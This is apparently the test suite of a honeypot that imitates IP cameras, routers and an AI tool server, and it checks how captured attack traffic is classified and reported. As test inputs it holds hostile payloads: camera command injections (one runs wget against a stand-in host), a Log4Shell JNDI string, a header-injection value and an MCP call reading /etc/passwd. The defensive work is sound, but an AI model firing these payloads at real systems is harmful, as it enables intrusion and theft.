"""Camera, router and AI-tool-server personas, and the classifications that came from real traffic."""
import asyncio
import base64
import json
import os
import re
import tempfile
import time
import unittest

from uninvited import intel, personas
from uninvited.core import Knock
from uninvited.feeds import FeedCache
from uninvited.listeners import CameraListener, HttpListener, McpListener, RouterListener
from uninvited.store import Store


def req(method="GET", path="/", headers=None, body=b"", target=None):
    h = {k.lower(): v for k, v in (headers or {}).items()}
    user, password, scheme = personas.parse_auth(h)
    return personas.HttpRequest(target=target or f"{method} {path} HTTP/1.1", method=method, path=path,
                                headers=h, body=body, raw=b"", user=user, password=password, auth=scheme)


def basic(user, password):
    return "Basic " + base64.b64encode(f"{user}:{password}".encode()).decode()


class AuthParsingTests(unittest.TestCase):
    def test_basic_carries_the_password(self):
        self.assertEqual(personas.parse_auth({"authorization": basic("admin", "12345")}),
                         ("admin", "12345", "basic"))

    def test_digest_carries_only_the_user_name(self):
        h = {"authorization": 'Digest username="root", realm="x", nonce="n", response="abc"'}
        self.assertEqual(personas.parse_auth(h), ("root", None, "digest"))

    def test_garbage_is_tolerated(self):
        self.assertEqual(personas.parse_auth({"authorization": "Basic !!!not-base64"}), (None, None, "basic"))
        self.assertEqual(personas.parse_auth({"authorization": "Bearer abc"}), (None, None, ""))
        self.assertEqual(personas.parse_auth({}), (None, None, ""))

    def test_long_values_are_cut(self):
        user, pw, _ = personas.parse_auth({"authorization": basic("u" * 500, "p" * 500)})
        self.assertEqual((len(user), len(pw)), (120, 120))


class CameraTests(unittest.TestCase):
    cfg = {"model": "IPC-2100"}

    def test_the_exploit_seen_on_the_live_site_gets_the_reply_a_vulnerable_camera_gives(self):
        reply, extra = personas.camera(req("PUT", "/SDK/webLanguage", body=b"<language>$(id)</language>"), self.cfg)
        self.assertEqual(reply.status, 200)
        self.assertIn(b"<statusCode>1</statusCode>", reply.body)
        self.assertEqual(extra["emulated"], "hikvision-weblanguage")

    def test_get_on_the_exploit_path_is_not_treated_as_the_exploit(self):
        reply, extra = personas.camera(req("GET", "/SDK/webLanguage"), self.cfg)
        self.assertEqual(reply.status, 401)           # a probe, not the injection
        self.assertNotIn("emulated", extra)

    def test_the_login_page_names_the_model(self):
        reply, _ = personas.camera(req("GET", "/"), self.cfg)
        self.assertEqual(reply.status, 200)
        self.assertIn(b"IPC-2100", reply.body)
        self.assertIn(b"password", reply.body)

    def test_the_auth_bypass_probe_lists_a_user_and_nothing_else(self):
        reply, extra = personas.camera(req("GET", "/Security/users?auth=YWRtaW46MTEK"), self.cfg)
        self.assertEqual(reply.status, 200)
        self.assertIn(b"<userName>admin</userName>", reply.body)
        self.assertNotIn(b"assword", reply.body)
        self.assertEqual(extra["emulated"], "hikvision-users")

    def test_protected_paths_challenge_and_the_nonce_is_fresh_each_time(self):
        a, _ = personas.camera(req("GET", "/ISAPI/System/deviceInfo"), self.cfg)
        b, _ = personas.camera(req("GET", "/ISAPI/System/deviceInfo"), self.cfg)
        self.assertEqual(a.status, 401)
        na = re.search(r'nonce="(\w+)"', dict(a.headers)["WWW-Authenticate"]).group(1)
        nb = re.search(r'nonce="(\w+)"', dict(b.headers)["WWW-Authenticate"]).group(1)
        self.assertNotEqual(na, nb)

    def test_basic_challenge_for_the_cgi_style_paths(self):
        reply, _ = personas.camera(req("GET", "/cgi-bin/snapshot.cgi"), self.cfg)
        self.assertEqual(reply.status, 401)
        self.assertTrue(dict(reply.headers)["WWW-Authenticate"].startswith("Basic"))

    def test_credentials_are_never_accepted(self):
        for path in ("/", "/ISAPI/System/deviceInfo", "/cgi-bin/snapshot.cgi", "/doc/page/login.asp"):
            reply, _ = personas.camera(req("GET", path, {"Authorization": basic("admin", "admin")}), self.cfg)
            self.assertNotIn(b"Streaming", reply.body, path)
            self.assertIn(reply.status, (200, 401), path)
            if path != "/" and path != "/doc/page/login.asp":
                self.assertEqual(reply.status, 401, path)

    def test_unknown_paths_are_a_404_with_the_vendor_banner(self):
        reply, _ = personas.camera(req("GET", "/nothing-here"), {"server": "App-webs/"})
        self.assertEqual(reply.status, 404)
        self.assertIn(b"App-webs/", reply.body)


class RouterTests(unittest.TestCase):
    cfg = {"model": "WR-1200"}

    def test_the_web_root_asks_for_a_basic_login(self):
        reply, _extra = personas.router(req("GET", "/"), self.cfg)
        self.assertEqual(reply.status, 401)
        self.assertTrue(dict(reply.headers)["WWW-Authenticate"].startswith("Basic"))

    def test_default_credentials_are_still_refused(self):
        reply, _ = personas.router(req("GET", "/", {"Authorization": basic("admin", "admin")}), self.cfg)
        self.assertEqual(reply.status, 401)

    def test_router_exploit_paths_get_plausible_replies(self):
        hnap, e1 = personas.router(req("POST", "/HNAP1/"), self.cfg)
        gpon, e2 = personas.router(req("POST", "/GponForm/diag_Form?images/"), self.cfg)
        self.assertEqual((hnap.status, e1["emulated"]), (200, "hnap"))
        self.assertEqual((gpon.status, e2["emulated"]), (200, "gpon"))

    def test_tr069_port_challenges_and_answers_the_soap_exploit_path(self):
        root, _ = personas.router(req("GET", "/"), self.cfg, "tr069")
        self.assertEqual(root.status, 401)
        self.assertTrue(dict(root.headers)["WWW-Authenticate"].startswith("Digest"))
        act, extra = personas.router(req("POST", "/UD/act?1", body=b"<soap/>"), self.cfg, "tr069")
        self.assertEqual(act.status, 200)
        self.assertEqual(extra["emulated"], "tr069-soap")
        self.assertIn(b"Envelope", act.body)

    def test_login_page_and_unknown_path(self):
        self.assertEqual(personas.router(req("GET", "/login"), self.cfg)[0].status, 200)
        self.assertEqual(personas.router(req("GET", "/zzz"), self.cfg)[0].status, 404)


class McpTests(unittest.TestCase):
    cfg = {}

    def rpc(self, method, mid=1, params=None, path="/mcp"):
        body = {"jsonrpc": "2.0", "method": method}
        if mid is not None:
            body["id"] = mid
        if params is not None:
            body["params"] = params
        return personas.mcp(req("POST", path, body=json.dumps(body).encode()), self.cfg)

    def test_initialize_and_tools_list(self):
        r, _extra, label = self.rpc("initialize")
        doc = json.loads(r.body)
        self.assertEqual(doc["id"], 1)
        self.assertEqual(doc["result"]["serverInfo"]["name"], "workspace-tools")
        self.assertIsNone(label)
        r, _, _ = self.rpc("tools/list", 2)
        names = [t["name"] for t in json.loads(r.body)["result"]["tools"]]
        self.assertEqual(names, ["read_file", "list_directory", "run_command"])

    def test_a_tool_call_is_refused_logged_and_labelled(self):
        r, extra, label = self.rpc("tools/call", 3, {"name": "run_command", "arguments": {"command": "id"}})
        doc = json.loads(r.body)
        self.assertTrue(doc["result"]["isError"])
        self.assertIn("permission denied", r.body.decode())
        self.assertEqual((extra["tool"], label), ("run_command", "MCP Tool Call Attempt"))
        self.assertIn("id", extra["arguments"])

    def test_notifications_get_no_body_and_bad_json_gets_a_parse_error(self):
        r, _, _ = self.rpc("notifications/initialized", None)
        self.assertEqual((r.status, r.body), (202, b""))
        r, _, _ = personas.mcp(req("POST", "/mcp", body=b"{not json"), self.cfg)
        self.assertEqual(json.loads(r.body)["error"]["code"], -32700)
        r, _, _ = personas.mcp(req("POST", "/mcp", body=b"[1,2]"), self.cfg)
        self.assertEqual(json.loads(r.body)["error"]["code"], -32600)

    def test_unknown_method_and_odd_ids(self):
        r, _, _ = self.rpc("no/such", {"x": 1})            # an id that is a dict is not echoed
        self.assertIsNone(json.loads(r.body)["id"])
        self.assertEqual(json.loads(self.rpc("no/such", 5)[0].body)["error"]["code"], -32601)

    def test_sse_announces_a_message_endpoint(self):
        r, _extra, _ = personas.mcp(req("GET", "/sse"), self.cfg)
        self.assertEqual(r.content_type, "text/event-stream")
        self.assertRegex(r.body.decode(), r"event: endpoint\r\ndata: /messages\?sessionId=[0-9a-f]{16}")

    def test_model_endpoints(self):
        r, _, _ = personas.mcp(req("GET", "/v1/models"), self.cfg)
        self.assertEqual(json.loads(r.body)["data"][0]["id"], "llama3.1:8b")
        r, _, _ = personas.mcp(req("GET", "/api/tags"), self.cfg)
        self.assertEqual(json.loads(r.body)["models"][0]["name"], "llama3.1:8b")

    def test_using_the_model_is_refused_and_labelled(self):
        for path in ("/v1/chat/completions", "/api/chat", "/api/generate", "/v1/completions"):
            r, _, label = personas.mcp(req("POST", path, body=b'{"prompt":"hi"}'), self.cfg)
            self.assertEqual((r.status, label), (429, "LLM Endpoint Abuse"), path)

    def test_unknown_path_is_a_404(self):
        self.assertEqual(personas.mcp(req("GET", "/zzz"), self.cfg)[0].status, 404)


class RtspTests(unittest.TestCase):
    def rtsp(self, method="DESCRIBE", path="rtsp://1.2.3.4:554/Streaming/Channels/101", headers=None):
        return personas.rtsp(req(method, path, headers or {"CSeq": "2"}), {"model": "IPC-2100"})

    def test_options_is_answered_and_lists_the_methods(self):
        data, _ = self.rtsp("OPTIONS")
        self.assertTrue(data.startswith(b"RTSP/1.0 200 OK\r\nCSeq: 2\r\n"))
        self.assertIn(b"Public: OPTIONS, DESCRIBE", data)

    def test_everything_else_asks_for_a_login_and_is_refused(self):
        for m in ("DESCRIBE", "SETUP", "PLAY", "ANNOUNCE", "RECORD"):
            data, _ = self.rtsp(m)
            self.assertTrue(data.startswith(b"RTSP/1.0 401 Unauthorized"), m)
            self.assertIn(b'WWW-Authenticate: Digest realm="IPC-2100"', data)

    def test_the_path_names_the_vendor_being_hunted(self):
        self.assertEqual(self.rtsp()[1]["vendor_hint"], "hikvision")
        self.assertEqual(self.rtsp(path="rtsp://x/cam/realmonitor?channel=1&subtype=0")[1]["vendor_hint"], "dahua")
        self.assertEqual(self.rtsp(path="rtsp://x/live/ch00_0")[1]["vendor_hint"], "generic-dvr")
        self.assertNotIn("vendor_hint", self.rtsp(path="rtsp://x/")[1])

    def test_a_hostile_cseq_cannot_inject_headers_into_our_reply(self):
        for evil in ("1\r\nSet-Cookie: x=1", "abc", "9" * 40, ""):
            data, _ = self.rtsp(headers={"CSeq": evil})
            self.assertEqual(data.count(b"\r\n\r\n"), 1, evil)
            self.assertNotIn(b"Set-Cookie", data)
            self.assertIn(b"CSeq: 0\r\n", data)

    def test_a_reply_never_carries_media(self):
        data, _ = self.rtsp("PLAY")
        self.assertLess(len(data), 400)
        self.assertNotIn(b"Content-Type: application/sdp", data)


class ReplyTests(unittest.TestCase):
    def test_content_length_is_exact_and_replies_are_small(self):
        samples = [personas.camera(req("GET", "/"), {})[0], personas.router(req("GET", "/"), {})[0],
                   personas.mcp(req("POST", "/mcp", body=b'{"jsonrpc":"2.0","id":1,"method":"tools/list"}'), {})[0]]
        for r in samples:
            raw = r.render("test")
            head, _, body = raw.partition(b"\r\n\r\n")
            self.assertEqual(int(re.search(rb"Content-Length: (\d+)", head).group(1)), len(body))
            self.assertLess(len(raw), 4096)
            self.assertIn(b"Connection: close", head)


class ClassificationTests(unittest.TestCase):
    """Every probe below was seen on the live site in the 500 most recent web events."""

    def classify(self, method, path, body=b"", headers=None, target=None):
        return HttpListener.classify(None, req(method, path, headers, body, target))

    def test_camera_and_router_exploits(self):
        self.assertEqual(self.classify("PUT", "/SDK/webLanguage")[0], "Hikvision RCE (CVE-2021-36260)")
        self.assertEqual(self.classify("GET", "/Security/users?auth=YWRtaW46MTEK")[0],
                         "Hikvision Auth Bypass (CVE-2017-7921)")
        self.assertEqual(self.classify("POST", "/ctrlt/DeviceUpgrade_1")[0], "Huawei HG532 RCE (CVE-2017-17215)")
        self.assertEqual(self.classify("POST", "/UD/act?1")[0], "TR-064 Router Exploit")
        self.assertEqual(self.classify("POST", "/GponForm/diag_Form?images/")[0], "GPON Router Exploit")
        self.assertEqual(self.classify("GET", "/boaform/admin/formLogin")[0], "IoT Router Exploit")
        self.assertEqual(self.classify("GET", "/ISAPI/System/deviceInfo")[0], "IP Camera Probe")

    def test_open_proxy_hunting(self):
        for method, path in (("CONNECT", "httpbin.org:443"), ("GET", "http://api.ipify.org/"),
                             ("GET", "http://a7x.overflow.biz/hachk.php")):
            self.assertEqual(self.classify(method, path)[0], "Open Proxy Probe", (method, path))

    def test_mcp_and_llm_discovery(self):
        for path in ("/mcp", "/mcp/", "/sse", "/v1/models", "/api/mcp", "/api/tags", "/.well-known/mcp"):
            self.assertEqual(self.classify("GET", path)[0], "MCP/LLM Endpoint Discovery", path)

    def test_odd_traffic_seen_on_the_live_site(self):
        self.assertEqual(self.classify("PRI", "*")[0], "HTTP/2 Prior-Knowledge Probe")
        self.assertEqual(self.classify("MGLNDD_99.", "/", target="MGLNDD_99. /")[0], "MGLNDD Scanner Banner")
        self.assertEqual(self.classify("\x7b", "/", target="{ w /")[0], "Malformed Request")
        self.assertEqual(self.classify("GET", "/favicon.ico")[0], "Unclassified Probe")
        self.assertEqual(self.classify("GET", "/login")[0], "Unclassified Probe")

    def test_an_exploit_that_only_shows_in_the_body_is_now_found(self):
        name, _ = self.classify("POST", "/api/x", body=b'{"a":"${jndi:ldap://evil/x}"}')
        self.assertEqual(name, "Log4Shell (CVE-2021-44228)")

    def test_a_normal_request_for_a_known_path_is_unaffected(self):
        self.assertEqual(self.classify("GET", "/.env")[0], "DotEnv File Exposure")
        self.assertEqual(self.classify("GET", "/wp-login.php")[0], "WordPress Probe")


class IntelTests(unittest.TestCase):
    def test_probes_are_not_exploits(self):
        names = {"Open Proxy Probe": 3, "MCP/LLM Endpoint Discovery": 2, "IP Camera Probe": 1,
                 "HTTP/2 Prior-Knowledge Probe": 1, "MGLNDD Scanner Banner": 1, "Malformed Request": 1}
        self.assertEqual(intel.named_exploits(names), [])

    def test_real_exploits_still_count(self):
        names = {"Hikvision RCE (CVE-2021-36260)": 1, "Open Proxy Probe": 5}
        self.assertEqual(intel.named_exploits(names), ["Hikvision RCE (CVE-2021-36260)"])

    def test_cves_for_the_three_new_signatures(self):
        for name, cve in (("Hikvision RCE (CVE-2021-36260)", "CVE-2021-36260"),
                          ("Hikvision Auth Bypass (CVE-2017-7921)", "CVE-2017-7921"),
                          ("Huawei HG532 RCE (CVE-2017-17215)", "CVE-2017-17215")):
            self.assertEqual(intel.tags({"HTTP": 3}, {name: 3})[1], [cve])

    def test_tags_for_each_behaviour(self):
        def t(by, ex=None, creds=None):
            return intel.behaviour_tags(by, ex or {}, [], 0, None, creds)
        self.assertIn("camera-exploit", t({"HTTP": 3}, {"Hikvision RCE (CVE-2021-36260)": 3}))
        self.assertIn("web-exploit", t({"HTTP": 3}, {"Hikvision RCE (CVE-2021-36260)": 3}))
        self.assertIn("router-exploit", t({"HTTP": 3}, {"GPON Router Exploit": 3}))
        self.assertIn("proxy-scan", t({"HTTP": 3}, {"Open Proxy Probe": 3}))
        self.assertNotIn("web-exploit", t({"HTTP": 3}, {"Open Proxy Probe": 3}))
        self.assertIn("web-scan", t({"HTTP": 3}, {"Open Proxy Probe": 3}))
        self.assertIn("ai-endpoint-scan", t({"HTTP": 3}, {"MCP/LLM Endpoint Discovery": 3}))
        self.assertIn("camera-scan", t({"CAM": 3}))
        self.assertIn("camera-bruteforce", t({"CAM": 3}, creds={"CAM": 3}))
        self.assertNotIn("camera-bruteforce", t({"CAM": 3}))
        self.assertIn("router-bruteforce", t({"ROUTER": 3}, creds={"ROUTER": 2}))
        abuse = t({"MCP": 3}, {"MCP Tool Call Attempt": 2})
        self.assertIn("ai-endpoint-abuse", abuse)
        self.assertNotIn("web-exploit", abuse)               # AI abuse is its own thing
        self.assertIn("ai-endpoint-scan", t({"MCP": 3}))

    def test_every_new_tag_is_described(self):
        for tag in ("camera-scan", "camera-bruteforce", "camera-exploit", "router-scan", "router-bruteforce",
                    "router-exploit", "proxy-scan", "ai-endpoint-scan", "ai-endpoint-abuse", "ics-control"):
            self.assertIn(tag, intel.TAG_DESCRIPTIONS)

    def test_techniques_for_the_new_services(self):
        self.assertEqual(intel.tags({"CAM": 3}, {})[0], ["T1595"])
        self.assertEqual(intel.tags({"CAM": 3}, {}, None, {"CAM": 3})[0], ["T1110.001", "T1595"])
        self.assertEqual(intel.tags({"ROUTER": 3}, {"GPON Router Exploit": 3})[0], ["T1190"])
        for tid in ("T0858", "T0843"):
            self.assertIn(tid, intel.ICS_TECHNIQUES)
            self.assertIn(tid, intel.TECHNIQUES)


class DeepfieldTests(unittest.TestCase):
    def test_the_nokia_crawler_is_recognised_by_its_reverse_dns(self):
        from uninvited.classify import Classifier
        self.assertEqual(Classifier._name_match("crawler150.deepfield.net"), ("Nokia Deepfield (research)", True))
        self.assertIsNone(Classifier._name_match("notdeepfield.net.example.com"))


async def talk(listener_cls, cfg, payloads, read=True):
    knocks = []

    async def emit(k):
        knocks.append(k)

    l = listener_cls(dict(cfg, port=0), emit, asyncio.Semaphore(10))
    l.server = await asyncio.start_server(l._wrap, "127.0.0.1", 0)
    port = l.server.sockets[0].getsockname()[1]
    out = []
    for data in payloads:
        r, w = await asyncio.open_connection("127.0.0.1", port)
        w.write(data)
        await w.drain()
        out.append(await asyncio.wait_for(r.read(4096), 5) if read else b"")
        w.close()
        await asyncio.sleep(0.05)
    l.server.close()
    await l.server.wait_closed()
    return knocks, out


class SocketTests(unittest.IsolatedAsyncioTestCase):
    async def test_camera_exploit_over_a_real_socket(self):
        body = b"<language>$(wget http://x/y)</language>"
        data = (b"PUT /SDK/webLanguage HTTP/1.1\r\nHost: h\r\nContent-Length: %d\r\n\r\n%s" % (len(body), body))
        knocks, out = await talk(CameraListener, {"service": "web"}, [data])
        self.assertTrue(out[0].startswith(b"HTTP/1.1 200 OK"))
        k = knocks[0]
        self.assertEqual(k.proto, "CAM")
        self.assertEqual(k.detail["exploit"], "Hikvision RCE (CVE-2021-36260)")
        self.assertEqual(k.detail["emulated"], "hikvision-weblanguage")
        self.assertIn(b"wget http://x/y", k.raw)                  # the second stage is in the capture

    async def test_default_credentials_are_captured_and_refused(self):
        data = b"GET / HTTP/1.1\r\nHost: h\r\nAuthorization: %s\r\n\r\n" % basic("admin", "admin").encode()
        knocks, out = await talk(RouterListener, {"service": "web"}, [data])
        self.assertTrue(out[0].startswith(b"HTTP/1.1 401"))
        k = knocks[0]
        self.assertEqual((k.proto, k.username, k.password, k.detail["auth"]), ("ROUTER", "admin", "admin", "basic"))

    async def test_rtsp_over_a_real_socket(self):
        data = (b"DESCRIBE rtsp://1.2.3.4:554/Streaming/Channels/101 RTSP/1.0\r\nCSeq: 7\r\n"
                b"User-Agent: LibVLC/3.0\r\nAuthorization: %s\r\n\r\n" % basic("admin", "12345").encode())
        knocks, out = await talk(CameraListener, {"service": "rtsp"}, [data])
        self.assertTrue(out[0].startswith(b"RTSP/1.0 401 Unauthorized\r\nCSeq: 7"))
        k = knocks[0]
        self.assertEqual((k.proto, k.username, k.password), ("CAM", "admin", "12345"))
        self.assertEqual((k.detail["exploit"], k.detail["service"], k.detail["vendor_hint"]),
                         ("RTSP Stream Probe", "rtsp", "hikvision"))
        self.assertIn(("vendor", "hikvision"), k.lines)

    async def test_tr069_port(self):
        data = b"POST /UD/act?1 HTTP/1.1\r\nHost: h\r\nSOAPAction: urn:x\r\nContent-Length: 6\r\n\r\n<soap/>"
        knocks, out = await talk(RouterListener, {"service": "tr069"}, [data])
        self.assertIn(b"Server: gSOAP", out[0])
        self.assertEqual(knocks[0].detail["exploit"], "TR-064 Router Exploit")

    async def test_mcp_tool_call_over_a_real_socket(self):
        body = json.dumps({"jsonrpc": "2.0", "id": 1, "method": "tools/call",
                           "params": {"name": "run_command", "arguments": {"command": "cat /etc/passwd"}}}).encode()
        data = b"POST /mcp HTTP/1.1\r\nHost: h\r\nContent-Type: application/json\r\nContent-Length: %d\r\n\r\n%s" % (len(body), body)
        knocks, out = await talk(McpListener, {}, [data])
        k = knocks[0]
        self.assertEqual((k.proto, k.detail["exploit"], k.detail["tool"]), ("MCP", "MCP Tool Call Attempt", "run_command"))
        self.assertEqual(k.detail["purpose"], "tool abuse")
        self.assertIn(("tool", "run_command"), k.lines)
        self.assertIn(b"permission denied", out[0])
        self.assertIn(b"cat /etc/passwd", k.raw)

    async def test_the_generic_web_decoy_still_answers_with_its_404(self):
        knocks, out = await talk(HttpListener, {}, [b"GET /favicon.ico HTTP/1.1\r\nHost: h\r\n\r\n"])
        self.assertTrue(out[0].startswith(b"HTTP/1.1 404 Not Found"))
        self.assertIn(b"nginx/1.24.0", out[0])
        self.assertEqual(knocks[0].detail["exploit"], "Unclassified Probe")

    async def test_open_proxy_probe_is_named_and_gets_a_404_not_a_tunnel(self):
        knocks, out = await talk(HttpListener, {}, [b"CONNECT httpbin.org:443 HTTP/1.1\r\nHost: httpbin.org:443\r\n\r\n"])
        self.assertTrue(out[0].startswith(b"HTTP/1.1 404"))
        self.assertEqual(knocks[0].detail["exploit"], "Open Proxy Probe")


class FeedEndToEnd(unittest.TestCase):
    def setUp(self):
        self.dir = tempfile.mkdtemp()
        self.db = os.path.join(self.dir, "t.db")
        self.store = Store(self.db)

    def tearDown(self):
        self.store.close()

    def hit(self, ip, proto, exploit, n=3, user=None):
        for i in range(n):
            self.store.record(Knock(
                proto=proto, ip=ip, port=8000 + i, ts=int(time.time()) - i, username=user,
                password="x" if user else None, lines=[("exploit", exploit)],
                detail={"exploit": exploit, "method": "PUT", "path": "/SDK/webLanguage"}))

    def row(self, ip):
        cache = FeedCache(self.db)
        cache.refresh()
        doc = json.loads(cache.get("attackers-24h.json").body)
        return {r["ip"]: r for r in doc["indicators"]}[ip]

    def test_a_camera_exploit_is_listed_with_its_cve_tags_and_technique(self):
        self.hit("93.184.216.50", "CAM", "Hikvision RCE (CVE-2021-36260)")
        r = self.row("93.184.216.50")
        self.assertIn("CVE-2021-36260", r["cves"])
        self.assertTrue({"camera-exploit", "camera-scan", "web-exploit", "cve-exploit"} <= set(r["tags"]))
        self.assertIn("T1190", r["attack_techniques"])
        self.assertIn("CAM", r["protocols"])

    def test_camera_logins_earn_the_bruteforce_tag_and_t1110(self):
        self.hit("93.184.216.51", "CAM", "Unclassified Probe", user="admin")
        r = self.row("93.184.216.51")
        self.assertIn("camera-bruteforce", r["tags"])
        self.assertIn("T1110.001", r["attack_techniques"])

    def test_an_open_proxy_scanner_is_listed_as_a_scanner_not_an_exploiter(self):
        self.hit("93.184.216.52", "HTTP", "Open Proxy Probe")
        r = self.row("93.184.216.52")
        self.assertIn("proxy-scan", r["tags"])
        self.assertNotIn("web-exploit", r["tags"])
        self.assertEqual(r["exploits"], [])


if __name__ == "__main__":
    unittest.main()
